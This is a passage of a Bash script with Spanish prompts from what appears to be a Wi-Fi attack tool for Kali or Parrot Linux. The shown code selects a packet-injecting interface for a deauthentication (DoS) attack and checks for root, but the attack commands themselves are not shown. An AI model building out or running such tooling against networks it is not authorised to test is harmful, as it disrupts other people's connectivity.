echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para hacer el ataque de desautenticacion (DoS)";echo
cuenta=1
for i in `cat ${pwd}airmon | grep -v $iface_ap | cut -f1`
do
    echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
    cuenta=$((cuenta+1))
done
echo;echo -ne "${AMARILLO}[::]${BLANCO} Debes estar seguro de que puede inyectar paquetes. Opcion: "
read opcion
validar_numero $opcion elegir_monitor 
cuenta=$((cuenta-1))
if [ $opcion -le $cuenta ]; then
	cuenta=$((cuenta+1))
  	cat ${pwd}airmon | grep -v $iface_ap| sed  -n ${opcion}p | cut -f 1 >${pwd}iface_dos
    iface_dos=`cat ${pwd}iface_dos`
    echo -ne "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_dos${BLANCO} para crear nuestro ataque DoS. Pulsa enter para continuar"
    read
    scan
else
    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
    read
    elegir_monitor
fi
}
if ! [ $(id -u) = 0 ]; then
    echo;echo -ne "${ROJO}[::]${BLANCO} El script se debe ejecutar con privilegios. Prueba con sudo. Pulsa enter para salir"
    read
    exit 1
fi
cat /etc/os-release | grep Parrot >${pwd}os
if [ $? -eq 0 ];then
    parrot=1
fi
cat /etc/os-release | grep -i kali >${pwd}os
if [ $? -eq 0 ];then
    kali=1
fi
empezar
